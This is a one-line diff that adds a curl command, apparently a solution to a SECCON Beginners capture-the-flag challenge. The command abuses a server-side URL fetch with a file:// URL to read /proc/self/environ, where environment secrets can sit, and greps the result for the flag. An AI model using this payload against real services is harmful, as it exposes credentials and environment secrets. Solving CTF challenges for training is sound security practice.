@@ -1,0 +1,1 @@
+curl 'https://ssrforlfi.beginners.seccon.games?url=file://localhost/proc/self/environ' -o - -s | strings | grep -o 'ctf4b{.*}'
